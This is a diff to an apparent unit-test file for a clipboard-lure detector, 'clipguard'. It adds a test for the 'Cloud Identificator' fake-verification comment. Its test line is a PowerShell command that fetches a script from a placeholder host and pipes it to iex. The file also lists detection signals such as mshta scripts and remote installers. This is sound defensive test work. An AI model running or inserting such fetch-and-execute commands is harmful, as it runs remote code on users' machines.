@@ -386,6 +386,7 @@ EXPECTED_SIGNAL = {
     "lure-thai-human-sara-am-decomposed.txt": "fake-verification comment",
     "lure-thai-unusual-traffic.txt": "fake-verification comment",
     "lure-thai-connection-check.txt": "fake-verification comment",
+    "lure-cloud-identificator.txt": "fake-verification comment",
 }
 ALL_SIGNALS = {
     "encoded command", "inline mshta script", "remote HTML application", "remote installer package",
@@ -485,6 +486,19 @@ class TestWhatTheSecondReadingFound(unittest.TestCase):
         command that already fetches and runs."""
         self.assertIsNone(clipguard.classify("echo hello # ฉันไม่ใช่หุ่นยนต์"))
         self.assertIsNone(clipguard.classify("curl -I https://example.com # ยืนยันว่าคุณเป็นมนุษย์"))
+
+    def test_the_cloud_identificator_tail_and_not_the_word_alone(self):
+        """The tail Unit 42 and Microsoft reported, with and without the space
+        after the colon and in either case; never "identificator" alone."""
+        line = 'powershell -c "iwr https://example.invalid/x | iex" # '
+        for tail in ("Cloud Identificator: 2031", "Cloud identificator:2031", "cloudidentificator 7",
+                     "CLOUD IDENTIFICATOR: 1"):
+            with self.subTest(tail=tail):
+                self.assertEqual(clipguard.classify(line + tail).tier, WARNING)
+        for tail in ("identificator", "transaction identificator", "icloud identificator", "yandexcloudidentificator",
+                     "identificatore tecnico", "cloud identifier"):
+            with self.subTest(tail=tail):
+                self.assertEqual(clipguard.classify(line + tail).tier, NOTICE)
 
     def test_a_launcher_inside_a_url_is_a_path(self):
         self.assertIsNone(clipguard.classify(
